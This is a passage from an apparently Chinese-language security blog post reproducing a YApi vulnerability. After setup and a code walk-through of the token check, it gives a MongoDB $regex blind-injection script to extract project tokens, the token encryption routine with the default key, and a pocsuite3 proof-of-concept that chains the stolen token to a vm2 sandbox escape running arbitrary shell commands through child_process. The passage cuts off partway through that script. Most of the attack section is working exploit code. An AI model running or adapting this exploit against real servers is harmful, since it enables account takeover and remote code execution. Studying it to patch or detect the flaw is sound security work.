src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672282515643-123a7b45-5334-4307-abe9-a49a45a4846d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672282818450-29a2a3dd-c1f0-429d-871d-46c6c4da45b3.png" alt="image.png"><br><code>docker</code> 安装后需要添加接口、创建项目。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672282978322-0859fa47-c5d6-448b-9fa6-c3d68d33ec4a.png" alt="image.png"></p><p>设置接口状态、导入接口<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672283120101-be0b98b6-3348-49ba-b077-75339a63a713.png" alt="image.png"></p><p>接口测试<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672284311215-a69d13a1-6ea2-47a6-b97b-e81a7297f2db.png" alt="image.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672292191900-34a12b45-58b2-4bd2-a25e-c14bcfad895b.png" alt="image.png"><br>修补文件为 <code>base.js</code>，修改了一条语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//新语句</span><br><span class="hljs-keyword">if</span> (token &amp;&amp; (openApiRouter.<span class="hljs-title function_">indexOf</span>(ctx.<span class="hljs-property">path</span>) &gt; -<span class="hljs-number">1</span> || ctx.<span class="hljs-property">path</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;/api/open/&#x27;</span>) === <span class="hljs-number">0</span> )) &#123;<br><br><span class="hljs-comment">//原语句</span><br><span class="hljs-keyword">if</span> (token &amp;&amp; <span class="hljs-keyword">typeof</span> token === <span class="hljs-string">&#x27;string&#x27;</span> &amp;&amp; (openApiRouter.<span class="hljs-title function_">indexOf</span>(ctx.<span class="hljs-property">path</span>) &gt; -<span class="hljs-number">1</span> || ctx.<span class="hljs-property">path</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;/api/open/&#x27;</span>) === <span class="hljs-number">0</span> )) &#123;<br></code></pre></td></tr></table></figure><p>修复方式：在if 判断中增加对参数token的验证，token 必须为字符串。<br>查看<a href=""> https://hellosean1025.github.io/yapi/openapi.html</a><code>/api/project/get</code>接受参数为<code>token</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672292525754-c4441b8b-7291-4380-9cda-41c59939743b.png" alt="image.png"><br>再<code>request.body、query</code>获取到<code>token</code>后，进入<code>parseToken()</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672292646764-ec1f4e79-e5c6-4158-882e-f1bc9faf20ec.png" alt="image.png"><br>进入<code>parseToken()</code>方法，判断<code>token</code>不为空，进行<code>ase</code>解密<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672292932567-08110fe7-20fb-4a3f-ba7b-e16b84330df7.png" alt="image.png"><br>加解密算法<code>ase192</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672292998895-24264415-c146-448b-857f-6b6a2673d79e.png" alt="image.png"><br><code>tokens</code>为非，进入<code>getProjectIdByToken()</code>方法中<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672293112976-4191d2af-ae7c-4246-b689-d850a828859b.png" alt="image.png"><br><code>getProjectIdByToken</code>方法在请求中获取到<code>token</code>，查询项目<code>id</code>。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672293224859-86afb8ad-020a-4f48-98b8-9d8cdfa53571.png" alt="image.png"><br>进入<code>findId</code>方法，使用<code>findOne</code>进行查询数据，使用<code>token</code>来查询。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672293597917-38656233-9f58-4912-8850-76816fe2aa7e.png" alt="image.png"><br>查询那个接口调用了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">/api/open/run_auto_test<br>/api/open/import_data<br>/api/interface/add<br>/api/interface/save<br>/api/interface/up<br>/api/interface/get<br>/api/interface/list<br>/api/interface/list_menu<br>/api/interface/add_cat<br>/api/interface/getCatMenu<br>/api/interface/list_cat<br>/api/project/get<br>/api/plugin/<span class="hljs-keyword">export</span><br>/api/project/up<br>/api/plugin/exportSwagger<br></code></pre></td></tr></table></figure><p>经过测试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">/api/interface/up<br>/api/interface/save<br>/api/project/up<br>/api/interface/add_cat <br></code></pre></td></tr></table></figure><p>经过测试这四个接口，方便测试，根据响应判断存在盲注（bool注入）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672369036260-7f74cbe6-972c-4c83-8ead-5ec2fe6b89f1.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1672369048711-a4cf1a35-09f2-4e5b-a144-3428bfe71934.png" alt="image.png"><br><strong>MongoDB</strong><br>MongoDB是一个基于分布式文件存储 [1]  的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。<br>MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。</p><p>MongoDB注入<br>$regex 正则匹配 ({“name”:{“$regex”:’^a$’}})，来进行查询</p><p>使用脚本来就行盲注获取token</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&quot;http://192.168.150.144:40001/api/interface/up&quot;</span><br>contes = <span class="hljs-string">&quot;abcdef0123456789&quot;</span><br><br>headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span>,<br>           <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br><br>current = <span class="hljs-string">&quot;^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-keyword">for</span> conte <span class="hljs-keyword">in</span> <span class="hljs-attr">contes</span>:<br>        guees = current + conte<br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: -<span class="hljs-number">1</span>,<br>            <span class="hljs-string">&quot;token&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;$regex&quot;</span>: guees,<br>                <span class="hljs-string">&quot;$nin&quot;</span>: []<br>            &#125;<br>        &#125;<br>        res = requests.<span class="hljs-title function_">post</span>(url=url,json=data,headers=headers,proxies=&#123;<span class="hljs-string">&#x27;https&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;).<span class="hljs-title function_">json</span>()<br><br>        errcode = res[<span class="hljs-string">&#x27;errcode&#x27;</span>]<br>        <span class="hljs-keyword">if</span> errcode == <span class="hljs-number">400</span>:<br>            current = guees<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1672724869594-dd98f6c3-ee2b-4c42-bdf4-58c450297d3b.png" alt="image.png"><br>获取<code>token</code>值，此时还需要对<code>token</code>值进行加密，下面是<code>JS</code>加密算法源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> aseEncode = <span class="hljs-keyword">function</span>(<span class="hljs-params">data, password</span>) &#123;<br><br>  <span class="hljs-comment">// 如下方法使用指定的算法与密码来创建cipher对象</span><br>  <span class="hljs-keyword">const</span> cipher = crypto.<span class="hljs-title function_">createCipher</span>(<span class="hljs-string">&#x27;aes192&#x27;</span>, password);<br><br>  <span class="hljs-comment">// 使用该对象的update方法来指定需要被加密的数据</span><br>  <span class="hljs-keyword">let</span> crypted = cipher.<span class="hljs-title function_">update</span>(data, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;hex&#x27;</span>);<br><br>  crypted += cipher.<span class="hljs-title function_">final</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><br>  <span class="hljs-keyword">return</span> crypted;<br>&#125;;<br><br><span class="hljs-keyword">const</span> defaultSalt = <span class="hljs-string">&#x27;abcde&#x27;</span>;<br><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">getToken</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">getToken</span>(<span class="hljs-params">token, uid</span>)&#123;<br>  <span class="hljs-keyword">if</span>(!token)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;token 不能为空&#x27;</span>)<br>  yapi.<span class="hljs-property">WEBCONFIG</span>.<span class="hljs-property">passsalt</span> = yapi.<span class="hljs-property">WEBCONFIG</span>.<span class="hljs-property">passsalt</span> || defaultSalt;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">aseEncode</span>(uid + <span class="hljs-string">&#x27;|&#x27;</span> + token, yapi.<span class="hljs-property">WEBCONFIG</span>.<span class="hljs-property">passsalt</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>加密方式为<code>aes192</code>、明文<code>uid|token</code>、密文<code>hex</code>、密钥<code>abcde</code></p><p>使用脚本实现算法</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs processing">data = <span class="hljs-string">&quot;11|fcc96d2f2036b1f9b039&quot;</span><br>def <span class="hljs-title function_">compute</span>(passphase: <span class="hljs-built_in">str</span>):<br>    nkey = <span class="hljs-number">24</span><br>    niv = <span class="hljs-number">16</span><br>    <span class="hljs-built_in">key</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    iv = <span class="hljs-string">&#x27;&#x27;</span><br>    p = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> True:<br>        h = hashlib.<span class="hljs-property">md5</span>()<br>        h.<span class="hljs-property">update</span>(binascii.<span class="hljs-property">unhexlify</span>(p))<br>        h.<span class="hljs-property">update</span>(passphase.<span class="hljs-property">encode</span>())<br>        p = h.<span class="hljs-property">hexdigest</span>()<br><br>        i = <span class="hljs-number">0</span><br>        n = <span class="hljs-built_in">min</span>(<span class="hljs-title function_">len</span>(p) - i, <span class="hljs-number">2</span> * nkey)<br>        nkey -= n <span class="hljs-comment">// 2</span><br>        <span class="hljs-built_in">key</span> += p[i:i + n]<br>        i += n<br>        n = <span class="hljs-built_in">min</span>(<span class="hljs-title function_">len</span>(p) - i, <span class="hljs-number">2</span> * niv)<br>        niv -= n <span class="hljs-comment">// 2</span><br>        iv += p[i:i + n]<br>        i += n<br><br><br>        <span class="hljs-keyword">if</span> nkey + niv == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> binascii.<span class="hljs-property">unhexlify</span>(<span class="hljs-built_in">key</span>), binascii.<span class="hljs-property">unhexlify</span>(iv)<br><br>def <span class="hljs-title function_">aes_encode</span>(data):<br>    <span class="hljs-built_in">key</span>, iv = <span class="hljs-title function_">compute</span>(<span class="hljs-string">&#x27;abcde&#x27;</span>)<br>    padder = padding.<span class="hljs-property">PKCS7</span>(<span class="hljs-number">128</span>).<span class="hljs-property">padder</span>()<br>    cipher = <span class="hljs-title function_">Cipher</span>(algorithms.<span class="hljs-property">AES</span>(<span class="hljs-built_in">key</span>), modes.<span class="hljs-property">CBC</span>(iv))<br>    encryptor = cipher.<span class="hljs-property">encryptor</span>()<br>    ct = encryptor.<span class="hljs-property">update</span>(padder.<span class="hljs-property">update</span>(data.<span class="hljs-property">encode</span>()) + padder.<span class="hljs-property">finalize</span>()) + encryptor.<span class="hljs-property">finalize</span>()<br>    <span class="hljs-keyword">return</span> binascii.<span class="hljs-property">hexlify</span>(ct).<span class="hljs-property">decode</span>()<br><br>pass2 = <span class="hljs-title function_">aes_encode</span>(data)<br><span class="hljs-built_in">print</span>(pass2)<br></code></pre></td></tr></table></figure><h2 id="POC3"><a href="#POC3" class="headerlink" title="POC3"></a>POC3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="hljs-keyword">import</span> Cipher, algorithms, modes<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> padding<br><span class="hljs-keyword">from</span> pocsuite3.api <span class="hljs-keyword">import</span> (<br>    minimum_version_required, POCBase, register_poc, requests, logger,<br>    OptString, OrderedDict,<br>    random_str<br>)<br><br>minimum_version_required(<span class="hljs-string">&#x27;1.9.6&#x27;</span>)<br><br>headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span>,<br>           <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoPOC</span>(<span class="hljs-title class_ inherited__">POCBase</span>):<br>    vulID = <span class="hljs-string">&#x27;99603&#x27;</span><br>    version = <span class="hljs-string">&#x27;1&#x27;</span><br>    author = <span class="hljs-string">&#x27;http://wiki.peiqi.tech/&#x27;</span><br>    vulDate = <span class="hljs-string">&#x27;2022-11-15&#x27;</span><br>    createDate = <span class="hljs-string">&#x27;2023-02-01&#x27;</span><br>    updateDate = <span class="hljs-string">&#x27;2023-02-01&#x27;</span><br>    references = [<span class="hljs-string">&#x27;https://www.seebug.org/vuldb/ssvid-99603&#x27;</span>]<br>    name = <span class="hljs-string">&#x27;Yapi_SQL注入&amp;命令执行&#x27;</span><br>    appPowerLink = <span class="hljs-string">&#x27;https://github.com/YMFE/yapi&#x27;</span><br>    appName = <span class="hljs-string">&#x27;Yapi&#x27;</span><br>    appVersion = <span class="hljs-string">&#x27;&lt; 1.11.0&#x27;</span><br>    vulType = <span class="hljs-string">&#x27;SQL Injection&#x27;</span><br>    desc = <span class="hljs-string">&#x27;YApi 是一个支持本地部署的可视化接口管理平台。YApi 在 1.12.0 之前的版本(目前所有版本)中由于 base.js 没有正确对 token 参数进行正确过滤，导致存在远程代码执行漏洞。攻击者可通过MongoDB注入获取用户 token，其中包括用户ID、项目ID等参数。yapi后台的pre-request和pre-response方法存在缺陷点，通过注入调用自动化测试接口runAutoTest()，进而利用沙箱逃逸触发命令执行。&#x27;</span><br>    samples = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    install_requires = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    pocDesc = <span class="hljs-string">&#x27;User manual of poc&#x27;</span><br>    dork = &#123;<span class="hljs-string">&#x27;zoomeye&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>    suricata_request = <span class="hljs-string">&#x27;&#x27;</span><br>    suricata_response = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_options</span>(<span class="hljs-params">self</span>):<br>        o = OrderedDict()<br>        o[<span class="hljs-string">&#x27;cmd&#x27;</span>] = OptString(<span class="hljs-string">&#x27;&#x27;</span>, description=<span class="hljs-string">&#x27;The param&#x27;</span>)<br>        <span class="hljs-keyword">return</span> o<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">token</span>(<span class="hljs-params">self</span>):<br>        contes = <span class="hljs-string">&quot;abcdef0123456789&quot;</span><br>        current = <span class="hljs-string">&quot;^&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>            <span class="hljs-keyword">for</span> conte <span class="hljs-keyword">in</span> contes:<br>                guees = current + conte<br>                data = &#123;<br>                    <span class="hljs-string">&quot;id&quot;</span>: -<span class="hljs-number">1</span>,<br>                    <span class="hljs-string">&quot;token&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;$regex&quot;</span>: guees,<br>                        <span class="hljs-string">&quot;$nin&quot;</span>: []<br>                    &#125;<br>                &#125;<br>                res = requests.post(url=self.url + <span class="hljs-string">&quot;/api/interface/up&quot;</span>, json=data, headers=headers).json()<br><br>                errcode = res[<span class="hljs-string">&#x27;errcode&#x27;</span>]<br>                <span class="hljs-keyword">if</span> errcode == <span class="hljs-number">400</span>:<br>                    current = guees<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> current<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compute</span>(<span class="hljs-params">self,passphase: <span class="hljs-built_in">str</span></span>):<br>        nkey = <span class="hljs-number">24</span><br>        niv = <span class="hljs-number">16</span><br>        key = <span class="hljs-string">&#x27;&#x27;</span><br>        iv = <span class="hljs-string">&#x27;&#x27;</span><br>        p = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            h = hashlib.md5()<br>            h.update(binascii.unhexlify(p))<br>            h.update(passphase.encode())<br>            p = h.hexdigest()<br><br>            i = <span class="hljs-number">0</span><br>            n = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(p) - i, <span class="hljs-number">2</span> * nkey)<br>            nkey -= n // <span class="hljs-number">2</span><br>            key += p[i:i + n]<br>            i += n<br>            n = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(p) - i, <span class="hljs-number">2</span> * niv)<br>            niv -= n // <span class="hljs-number">2</span><br>            iv += p[i:i + n]<br>            i += n<br><br>            <span class="hljs-keyword">if</span> nkey + niv == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> binascii.unhexlify(key), binascii.unhexlify(iv)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encode</span>(<span class="hljs-params">self,data</span>):<br>        key, iv = self.compute(<span class="hljs-string">&#x27;abcde&#x27;</span>)<br>        padder = padding.PKCS7(<span class="hljs-number">128</span>).padder()<br>        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))<br>        encryptor = cipher.encryptor()<br>        ct = encryptor.update(padder.update(data.encode()) + padder.finalize()) + encryptor.finalize()<br>        <span class="hljs-keyword">return</span> binascii.hexlify(ct).decode()<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_exploit</span>(<span class="hljs-params">self, param=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._check(dork=<span class="hljs-string">&#x27;&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        guess = self.token()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):<br>            token = self.aes_encode(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>|<span class="hljs-subst">&#123;guess[<span class="hljs-number">1</span>:]&#125;</span>&#x27;</span>)<br>            params = &#123;<span class="hljs-string">&quot;token&quot;</span>: token&#125;<br>            resopnse = requests.get(url=self.url + <span class="hljs-string">&quot;/api/project/get&quot;</span>, params=params,<br>                                    proxies=&#123;<span class="hljs-string">&#x27;https&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;).json()<br>            errcode = resopnse[<span class="hljs-string">&#x27;errcode&#x27;</span>]<br>            <span class="hljs-keyword">if</span> errcode == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">id</span> = resopnse[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;_id&#x27;</span>]<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment"># 验证token 和id值是否正确</span><br>        params = &#123;<span class="hljs-string">&#x27;token&#x27;</span>: token, <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;json&quot;</span>&#125;<br>        response = requests.get(url=self.url + <span class="hljs-string">&quot;/api/open/run_auto_test&quot;</span>, params=params,<br>                                proxies=&#123;<span class="hljs-string">&#x27;https&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;).json()<br><br><br>        <span class="hljs-comment"># 上传脚本 vm2</span><br>        script_template = <span class="hljs-string">r&#x27;&#x27;&#x27;const sandbox = this</span><br><span class="hljs-string">        const ObjectConstructor = this.constructor</span><br><span class="hljs-string">        const FunctionConstructor = ObjectConstructor.constructor</span><br><span class="hljs-string">        const myfun = FunctionConstructor(&#x27;return process&#x27;)</span><br><span class="hljs-string">        const process = myfun()</span><br><span class="hljs-string">        const Buffer = FunctionConstructor(&#x27;return Buffer&#x27;)()</span><br><span class="hljs-string">        const output = process.mainModule.require(&quot;child_process&quot;).execSync(Buffer.from(&#x27;%s&#x27;, &#x27;hex&#x27;).toString()).toString()</span><br><span class="hljs-string">        context.responseData = &#x27;testtest&#x27; + output + &#x27;testtest&#x27;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        command_hex = param.encode().<span class="hljs-built_in">hex</span>()<br>        script = script_template % command_hex<br>        resopnse = requests.post(url=self.url + <span class="hljs-string">&quot;/api/project/up&quot;</span>, params=&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;, json=&#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>, <span class="hljs-string">&#x27;after_script&#x27;</span>: script&#125;,<br>                                 proxies=&#123;<span class="hljs-string">&#x27;https&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;).json()<br>        errcode = resopnse[<span class="hljs-string">&#x27;errcode&#x27;</span>]<br>        <span class="hljs-keyword">if</span> errcode == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;update OK&quot;</span>)<br><br>        params = &#123;<span class="hljs-string">&#x27;token&#x27;</span>: token, <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;json&quot;</span>&#125;<br>        response = requests.get(url=self.url + <span class="hljs-string">&quot;/api/open/run_auto_test&quot;</span>, params=params,<br>                                